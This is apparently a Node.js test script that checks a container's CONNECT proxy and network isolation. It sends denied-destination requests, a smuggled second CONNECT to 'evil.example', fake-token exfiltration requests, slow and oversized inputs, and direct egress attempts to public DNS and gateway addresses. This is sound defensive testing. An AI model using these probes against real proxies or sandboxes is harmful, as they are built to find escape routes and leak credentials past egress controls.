// T-538: run inside a container over stdin. MODE relay or unix, ROWS a comma list. One JSON line per
// row. Stub-free, no credential of any kind; the only peer that answers is the test's echo sink.
import dgram from "node:dgram";
import dnsp from "node:dns/promises";
import fs from "node:fs";
import net from "node:net";

const mode = process.env.MODE;
const good = process.env.GOOD;
const dial = () => { const s = mode === "relay" ? net.connect(3128, "127.0.0.1") : net.connect("/vol/sock/proxy.sock"); s.on("error", () => {}); return s; };
const req = (a) => `CONNECT ${a} HTTP/1.1\r\nHost: ${a}\r\n\r\n`;
const first = (b) => b.split("\r\n")[0];
const send = (text, ms = 3000) => new Promise((res) => {
  const c = dial(); let b = "";
  c.on("connect", () => c.write(text));
  c.on("data", (d) => { b += d; if (b.includes("\r\n\r\n")) { c.destroy(); res(first(b)); } });
  c.on("error", (e) => res(`error ${e.code}`));
  c.on("close", () => res(b ? first(b) : "closed"));
  setTimeout(() => { c.destroy(); res("timeout"); }, ms);
});
const ask = (a, ms) => send(req(a), ms);
const tunnelUp = (c) => new Promise((res) => { c.on("connect", () => c.write(req(good))); c.once("data", () => res()); });
const tcp = (host, port) => new Promise((res) => { const s = net.connect({ host, port }); const t = setTimeout(() => { s.destroy(); res("TIMEOUT"); }, 2000); s.on("connect", () => { clearTimeout(t); s.destroy(); res("OPEN"); }); s.on("error", (e) => { clearTimeout(t); res(e.code); }); });
const udp = (host, port, fam = "udp4") => new Promise((res) => { const s = dgram.createSocket(fam); s.on("error", (e) => { s.close(); res(e.code); }); s.send("x", port, host, (e) => { try { s.close(); } catch {} res(e ? e.code : "SENT"); }); });

const T = {
  connect: () => ask(good),
  async denied() { const out = {}; for (const a of ["evil.example:443", "10.0.0.1:443", "[::1]:443", "user@sink:8080", "SINK:8080", "sink.:8080", "sink:08080", "sink:9", "sink%2e:8080"]) out[a] = await ask(a); return out; },
  async token() { const out = []; for (const m of ["CONNECT FAKETOKEN123:443 HTTP/1.1\r\n\r\n", "CONNECT evil.example:443 HTTP/1.1\r\nProxy-Authorization: FAKETOKEN123\r\n\r\nFAKETOKEN123", "GET http://evil.example:80/FAKETOKEN123 HTTP/1.1\r\n\r\n", "POST / HTTP/1.1\r\n\r\n"]) out.push(await send(m, 2000)); return out; },
  async echo() { const c = dial(); let b = ""; await tunnelUp(c); c.write("half-close-row"); c.end(); await new Promise((res) => { c.on("data", (d) => (b += d)); c.on("end", res); c.on("close", res); setTimeout(res, 4000); }); c.destroy(); return b; },
  async smuggle() { const c = dial(); let b = ""; c.on("connect", () => c.write(req(good) + "CONNECT evil.example:443 HTTP/1.1\r\n\r\n")); await new Promise((r) => { c.on("data", (d) => (b += d)); setTimeout(r, 1500); }); c.destroy(); return b.includes("CONNECT evil.example"); },
  async slow() { const c = dial(); const t0 = Date.now(); let reply = ""; const i = setInterval(() => { if (!c.destroyed) c.write("C"); }, 500); await new Promise((res) => { c.on("data", (d) => (reply += d)); c.on("close", res); setTimeout(res, 15000); }); clearInterval(i); c.destroy(); return { reply: first(reply), ms: Date.now() - t0 }; },
  async big() { const c = dial(); await new Promise((r) => c.on("connect", r)); c.write("X".repeat(9000)); const r = await new Promise((res) => { let b = ""; c.on("data", (d) => (b += d)); c.on("close", () => res(first(b) || "closed")); setTimeout(() => res("timeout"), 3000); }); c.destroy(); return r; },
  async concurrent() { const n = 20; const rs = await Promise.all(Array.from({ length: n }, (_, i) => new Promise((res) => { const c = dial(); let st = 0, b = ""; c.on("connect", () => c.write(req(good))); c.on("data", (d) => { b += d; if (!st && b.includes("\r\n\r\n")) { st = 1; b = ""; c.write(`stream-${i}`); } else if (st && b === `stream-${i}`) { c.destroy(); res(1); } }); setTimeout(() => { c.destroy(); res(0); }, 8000); }))); return rs.reduce((a, b) => a + b, 0); },
  async sockets() { const cs = []; for (let i = 0; i < 40; i++) cs.push(dial()); await new Promise((r) => setTimeout(r, 1000)); const alive = cs.filter((c) => !c.destroyed).length; cs.forEach((c) => c.destroy()); await new Promise((r) => setTimeout(r, 500)); return alive; },
  async backpressure() { const c = dial(); let st = 0, wrote = 0, got = 0, pausedAt = 0; const sz = 64 * 1048576; const chunk = Buffer.alloc(1048576, 7); await new Promise((res) => { c.on("connect", () => c.write(req(good))); c.on("data", (d) => { if (!st) { st = 1; c.pause(); const w = () => { while (wrote < sz) { wrote += chunk.length; if (!c.write(chunk)) return c.once("drain", w); } }; w(); setTimeout(() => { pausedAt = wrote; c.resume(); }, 2000); return; } got += d.length; if (got >= sz) res(); }); c.on("close", res); setTimeout(res, 60000); }); c.destroy(); return { pausedAt, got, sz }; },
  async ceiling() { const c = dial(); let sent = 0; const chunk = Buffer.alloc(65536, 1); await tunnelUp(c); const w = () => { while (!c.destroyed && sent < 64 * 1048576) { sent += chunk.length; if (!c.write(chunk)) return c.once("drain", w); } }; w(); await new Promise((res) => { c.on("close", res); setTimeout(res, 20000); }); return { closed: c.destroyed || c.closed, after: await ask(good) }; },
  async hold() { const c = dial(); const t0 = Date.now(); await tunnelUp(c); await new Promise((res) => { c.on("close", res); setTimeout(res, 25000); }); c.destroy(); return Date.now() - t0; },
  async conntunnel() { const c = dial(); let b = ""; await tunnelUp(c); c.on("data", (d) => (b += d)); const rest = []; for (let i = 0; i < 5; i++) rest.push(await ask(good)); c.write("still-open"); await new Promise((x) => setTimeout(x, 500)); c.destroy(); return { rest, echoed: b }; },
  async plainget() { const c = dial(); let b = ""; c.on("connect", () => c.write(`GET http://${good}/v1 HTTP/1.1\r\nHost: x\r\n\r\n`)); await new Promise((r) => { c.on("data", (d) => (b += d)); setTimeout(r, 1000); }); c.destroy(); return first(b); },
  async direct() {
    const targets = JSON.parse(process.env.TARGETS); const out = {};
    for (const [h, p] of targets) out[`tcp ${h}:${p}`] = await tcp(h, p);
    for (const h of ["2001:4860:4860::8888", "::1"]) out[`tcp6 ${h}`] = await tcp(h, 53);
    for (const [h, p] of [["8.8.8.8", 53], [process.env.GW, 111], ["192.168.65.1", 53]]) out[`udp ${h}:${p}`] = await udp(h, p);
    out["udp6 public"] = await udp("2001:4860:4860::8888", 53, "udp6");
    for (const n of ["example.com", "sink", "host.docker.internal"]) out[`lookup ${n}`] = await dnsp.lookup(n).then(() => "ANSWERED", (e) => e.code);
    out["txt example.com"] = await dnsp.resolveTxt("example.com").then(() => "ANSWERED", (e) => e.code);
    return out;
  },
  async interfaces() { return { dev: fs.readFileSync("/proc/net/dev", "utf8").split("\n").slice(2).map((l) => l.split(":")[0].trim()).filter(Boolean).sort(), routes: fs.readFileSync("/proc/net/route", "utf8").trim().split("\n").length - 1 }; },
  async listeners() { return fs.readFileSync("/proc/net/tcp", "utf8").trim().split("\n").slice(1).map((l) => l.trim().split(/\s+/)).filter((c) => c[3] === "0A").map((c) => c[1]); },
};
for (const row of process.env.ROWS.split(",")) console.log(JSON.stringify({ row, value: await T[row]() }));
process.exit(0);
